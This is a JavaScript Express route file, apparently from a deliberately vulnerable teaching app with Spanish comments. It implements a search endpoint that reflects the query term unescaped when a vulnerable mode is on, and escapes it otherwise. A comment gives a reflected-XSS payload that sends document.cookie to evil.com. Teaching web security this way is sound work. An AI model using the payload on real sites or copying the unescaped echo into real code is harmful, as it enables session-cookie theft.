import { Router } from 'express';
import { db } from '../db/connection.js';
import { requireAuth } from '../middleware/auth.js';
import { isVulnerable } from '../config/env.js';
import { stripHtml } from '../utils/sanitize.js';

export const searchRouter = Router();

/**
 * Vector 5 — Cross-Site Scripting (XSS reflejado), complemento del
 * almacenado en comments.routes.js. Ejemplo de la guía:
 *   GET /search?q=<script>fetch('http://evil.com/steal?c='+document.cookie)</script>
 *
 * VULNERABLE: el término de búsqueda se devuelve tal cual en "echo"; el
 * frontend lo inyecta con dangerouslySetInnerHTML en el encabezado de
 * resultados ("Resultados para: ..."), así que el script del parámetro se
 * ejecuta en el navegador de la víctima que abre el enlace manipulado.
 *
 * PARCHEADA: el eco se escapa con stripHtml() antes de devolverlo.
 */
searchRouter.get('/', requireAuth, (req, res) => {
  const q = String(req.query.q || '');
  const like = `%${q}%`;

  const customers = db
    .prepare('SELECT id, name, nit, email FROM customers WHERE owner_id = ? AND name LIKE ?')
    .all(req.user.id, like);

  res.json({
    echo: isVulnerable() ? q : stripHtml(q),
    customers,
  });
});
